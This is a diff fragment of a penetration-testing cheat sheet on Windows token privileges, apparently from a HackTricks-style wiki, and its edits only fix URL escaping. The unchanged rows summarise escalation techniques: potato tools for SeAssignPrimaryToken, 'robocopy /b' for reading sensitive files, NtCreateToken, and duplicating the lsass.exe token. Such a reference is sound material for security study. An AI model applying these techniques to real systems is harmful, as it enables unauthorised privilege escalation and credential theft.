-| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte\_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                        |
+| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                        |
 | **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Read sensitve files with `robocopy /b`                                                                                                                                                                                                                                                                                                             | <p>- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br><br>- <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files.<br><br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter.</p>                                                                      |
 | **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
 | **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate the `lsass.exe` token.                                                                                                                                                                                                                                                                                                                   | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)                                                                                                                                                                                                         |
@@ -186,7 +609,7 @@ Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](http
 ## Reference
 
 * Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
-* Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing\_token\_eop\_1.0.txt) about privesc with tokens.
+* Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
 
 <details>
 
